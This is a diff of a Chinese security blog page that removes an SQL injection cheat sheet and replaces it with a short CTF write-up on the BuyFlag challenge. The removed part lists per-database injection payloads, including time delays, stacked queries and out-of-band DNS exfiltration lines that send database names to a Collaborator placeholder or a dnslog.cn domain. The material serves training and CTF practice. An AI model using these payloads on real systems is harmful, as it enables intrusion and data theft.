@@ -16,24 +16,29 @@
   <meta name="author" content="YY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="sql注入查询表sql注入查询表，可能会更新。 字符串拼接将多个字符串拼接为一个。    数据库 语法    Oracle &#96;’foo’   Microsoft &#39;foo&#39;+&#39;bar&#39;   PostgreSQL &#96;’foo’   MySQL &#39;foo&#39; &#39;bar&#39;CONCAT(&#39;foo&#39;,&#39;ba">
+    <meta name="description" content="[极客大挑战 2019]BuyFlag进入题目后是一个介绍页面，有一个子页面：  要得到FLAG需要100000000，还有两个提示必须是来自CUIT的学生，必须回答正确密码； 查看源代码，有这样一段： 1234567891011&lt;!--	~~~post money and password~~~if (isset($_POST[&amp;#x27;password&amp;#x27;])) &amp;#123;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[burpsuite] academy-sql注入查询表">
-<meta property="og:url" content="https://s1n9l3.github.io/2022/11/13/[burpsuite]%20academy-sql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2%E8%A1%A8/index.html">
+<meta property="og:title" content="[ctf-web] 极客大挑战2019-BuyFlag">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/11/14/[ctf-web]%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/index.html">
 <meta property="og:site_name" content="S1n9l3">
-<meta property="og:description" content="sql注入查询表sql注入查询表，可能会更新。 字符串拼接将多个字符串拼接为一个。    数据库 语法    Oracle &#96;’foo’   Microsoft &#39;foo&#39;+&#39;bar&#39;   PostgreSQL &#96;’foo’   MySQL &#39;foo&#39; &#39;bar&#39;CONCAT(&#39;foo&#39;,&#39;ba">
+<meta property="og:description" content="[极客大挑战 2019]BuyFlag进入题目后是一个介绍页面，有一个子页面：  要得到FLAG需要100000000，还有两个提示必须是来自CUIT的学生，必须回答正确密码； 查看源代码，有这样一段： 1234567891011&lt;!--	~~~post money and password~~~if (isset($_POST[&amp;#x27;password&amp;#x27;])) &amp;#123;">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-13T12:53:55.083Z">
-<meta property="article:modified_time" content="2022-11-13T13:31:06.435Z">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221237132.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221703187.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221831698.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114222013263.png">
+<meta property="article:published_time" content="2022-11-14T14:09:01.745Z">
+<meta property="article:modified_time" content="2022-11-14T14:20:21.232Z">
 <meta property="article:author" content="YY">
-<meta property="article:tag" content="渗透测试">
-<meta property="article:tag" content="sql注入">
-<meta property="article:tag" content="burpsuite">
+<meta property="article:tag" content="http">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="ctf-web">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221237132.png">
   
   
   
-  <title>[burpsuite] academy-sql注入查询表 - S1n9l3</title>
+  <title>[ctf-web] 极客大挑战2019-BuyFlag - S1n9l3</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[burpsuite] academy-sql注入查询表"></span>
+            <span id="subtitle" data-typed-text="[ctf-web] 极客大挑战2019-BuyFlag"></span>
           
         </div>
 
@@ -209,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-13 20:53" pubdate>
-          2022年11月13日 晚上
+        <time datetime="2022-11-14 22:09" pubdate>
+          2022年11月14日 晚上
         </time>
       </span>
     
@@ -221,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3k 字
+          602 字
         
       </span>
     
@@ -232,7 +237,7 @@
         
         
         
-          26 分钟
+          6 分钟
         
       </span>
     
@@ -270,271 +275,25 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[burpsuite] academy-sql注入查询表</h1>
+            <h1 style="display: none">[ctf-web] 极客大挑战2019-BuyFlag</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="sql注入查询表"><a href="#sql注入查询表" class="headerlink" title="sql注入查询表"></a>sql注入查询表</h1><p>sql注入查询表，可能会更新。</p>
-<h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>将多个字符串拼接为一个。</p>
-<table>
-<thead>
-<tr>
-<th>数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Oracle</td>
-<td>&#96;’foo’</td>
-</tr>
-<tr>
-<td>Microsoft</td>
-<td><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
-</tr>
-<tr>
-<td>PostgreSQL</td>
-<td>&#96;’foo’</td>
-</tr>
-<tr>
-<td>MySQL</td>
-<td><code>&#39;foo&#39; &#39;bar&#39;</code><br /><code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
-</tr>
-</tbody></table>
-<h2 id="字符串子串"><a href="#字符串子串" class="headerlink" title="字符串子串"></a>字符串子串</h2><p>字符串截取。</p>
-<table>
-<thead>
-<tr>
-<th>数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Oracle</td>
-<td><code>SUBSTR(&#39;foobar&#39;,4,2)</code></td>
-</tr>
-<tr>
-<td>Microsoft</td>
-<td><code>SUBSTRING(&#39;foobar&#39;,4,2)</code></td>
-</tr>
-<tr>
-<td>PostgreSQL</td>
-<td><code>SUBSTRING(&#39;foobar&#39;,4,2)</code></td>
-</tr>
-<tr>
-<td>MySQL</td>
-<td><code>SUBSTRING(&#39;foobar&#39;,4,2)</code></td>
-</tr>
-</tbody></table>
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释。</p>
-<table>
-<thead>
-<tr>
-<th>数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Oracle</td>
-<td><code>--comment</code></td>
-</tr>
-<tr>
-<td>Microsoft</td>
-<td><code>--comment</code><br /><code>/*comment*/</code></td>
-</tr>
-<tr>
-<td>PostgreSQL</td>
-<td><code>--comment</code><br /><code>/*comment*/</code></td>
-</tr>
-<tr>
-<td>MySQL</td>
-<td><code>#comment</code><br /><code>-- comment</code><br /><code>/*comment*/</code></td>
-</tr>
-</tbody></table>
-<h2 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h2><p>数据库版本。</p>
-<table>
-<thead>
-<tr>
-<th>数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Oracle</td>
-<td><code>SELECT banner FROM v$version</code><br /><code>SELECT version FROM v$instance</code></td>
-</tr>
-<tr>
-<td>Microsoft</td>
-<td><code>SELECT @@version</code></td>
-</tr>
-<tr>
-<td>PostgreSQL</td>
-<td><code>SELECT version()</code></td>
-</tr>
-<tr>
-<td>MySQL</td>
-<td><code>SELECT @@version</code></td>
-</tr>
-</tbody></table>
-<h2 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h2><p>数据库内容。</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td><code>SELECT * FROM all_tables</code><br /><code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td><code>SELECT * FROM information_schema.tables</code><br /><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td><code>SELECT * FROM information_schema.tables</code><br /><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td><code>SELECT * FROM information_schema.tables</code><br /><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-</tbody></table>
-<h2 id="条件错误"><a href="#条件错误" class="headerlink" title="条件错误"></a>条件错误</h2><p>测试单个布尔条件，如果条件为真，则触发数据库错误。</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>使用批处理查询（堆叠查询）连续执行多个查询。请注意，在执行后续查询时，结果不会返回给应用程序。因此，此技术主要用于盲漏洞，可以使用第二个查询来触发DNS查找、条件错误或时间延迟。</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td>不支持</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-</tbody></table>
-<h2 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h2><p>处理查询时，可能会导致数据库中的时间延迟。以下情况将导致10秒的无条件延时。</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td><code>SELECT pg_sleep(10)</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td><code>SELECT SLEEP(10)</code></td>
-</tr>
-</tbody></table>
-<h2 id="条件时间延迟"><a href="#条件时间延迟" class="headerlink" title="条件时间延迟"></a>条件时间延迟</h2><p>可以测试单个布尔条件，如果条件为真，则触发时间延迟。</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td>&#96;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<h2 id="DNS-lookup"><a href="#DNS-lookup" class="headerlink" title="DNS lookup"></a>DNS lookup</h2><p>可以使数据库对外部域执行DNS查找。要做到这一点，需要使用<code>Burp Collaborator</code>客户端生成将在攻击中使用的唯一Burp协作器子域，然后轮询协作器服务器以确认发生了DNS查找。</p>
-<table>
-<thead>
-<tr>
-<th align="left">数据库</th>
-<th>语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td>利用XXE触发DNS lookup，该漏洞已修复：<br /><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code> <br /><br />以下适用于打过补丁的，但是需要提权 ：<br /><code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td>仅在windows有效：<br /><code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> <br /><code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td>
-</tr>
-</tbody></table>
-<p>在MySQL的实例：</p>
-<p>首先在<code>dnslog.cn</code>生成一个域名，然后进行这样的查询：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;//&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.81k8pu.dnslog.cn/abc&#x27;</span>));<br></code></pre></td></tr></table></figure>
+                <h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>进入题目后是一个介绍页面，有一个子页面：</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221237132.png" srcset="/img/loading.gif" lazyload alt="image-20221114221237132"></p>
+<p>要得到FLAG需要100000000，还有两个提示必须是来自CUIT的学生，必须回答正确密码；</p>
+<p>查看源代码，有这样一段：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">	~~~post money and password~~~</span><br><span class="hljs-comment">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="hljs-comment">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="hljs-comment">	if (is_numeric($password)) &#123;</span><br><span class="hljs-comment">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">	&#125;elseif ($password == 404) &#123;</span><br><span class="hljs-comment">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="hljs-comment">	&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>在<code>dnslog.cn</code>中刷新就会得到记录：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[数据库]</span>.<span class="hljs-number">81</span>k8pu<span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure>
-
-
-
+<p>发送POST请求，参数为<code>password</code>，如果参数是不是数字，且等于<code>404</code>就是正确密码；由于PHP的<code>==</code>是弱类型比较，所以类似<code>404;==404</code>返回的是<code>true</code>，而且<code>404;</code>不是数字。</p>
+<p>抓包发送请求，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221703187.png" srcset="/img/loading.gif" lazyload alt="image-20221114221703187"></p>
+<p>提示身份不对不能购买；看到<code>Cookie</code>中有<code>user</code>，所以修改参数为<code>1</code>，重新发送请求，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114221831698.png" srcset="/img/loading.gif" lazyload alt="image-20221114221831698"></p>
+<p>提示密码正确，需要money，那么添加一个参数<code>money</code>，但是又提示参数太长了，使用科学计数法：</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221114222013263.png" srcset="/img/loading.gif" lazyload alt="image-20221114222013263"></p>
+<p>得到flag。</p>
 
                 
               </div>
@@ -553,27 +312,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
-  
-  
-
-      </span>
-    
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="category-chain-item">sql注入</a>
-  
-  
-
-      </span>
-    
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/burpsuite/" class="category-chain-item">burpsuite</a>
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
   
   
 
@@ -588,11 +327,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+        <a href="/tags/http/">#http</a>
       
-        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a>
+        <a href="/tags/ctf/">#ctf</a>
       
-        <a href="/tags/burpsuite/">#burpsuite</a>
+        <a href="/tags/ctf-web/">#ctf-web</a>
       
     </div>
   
@@ -604,8 +343,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[burpsuite] academy-sql注入查询表</div>
-      <div>https://s1n9l3.github.io/2022/11/13/[burpsuite] academy-sql注入查询表/</div>
+      <div>[ctf-web] 极客大挑战2019-BuyFlag</div>
+      <div>https://s1n9l3.github.io/2022/11/14/[ctf-web] 极客大挑战2019-BuyFlag/</div>
     </div>
     <div class="license-meta">
       
@@ -617,7 +356,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月13日</div>
+          <div>2022年11月14日</div>
         </div>
       
       
@@ -649,9 +388,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/14/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/" title="[ctf-web] 极客大挑战2019-BuyFlag">
+                      <a href="/2022/11/14/%5Bctf-web%5D%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/" title="[ctf-web] 极客大挑战2019-BabySQL">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[ctf-web] 极客大挑战2019-BuyFlag</span>
+                        <span class="hidden-mobile">[ctf-web] 极客大挑战2019-BabySQL</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -659,8 +398,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/13/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4/" title="[burpsuite] academy-sql注入实验室">
-                        <span class="hidden-mobile">[burpsuite] academy-sql注入实验室</span>
+                      <a href="/2022/11/13/%5Bburpsuite%5D%20academy-sql%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2%E8%A1%A8/" title="[burpsuite] academy-sql注入查询表">
+                        <span class="hidden-mobile">[burpsuite] academy-sql注入查询表</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
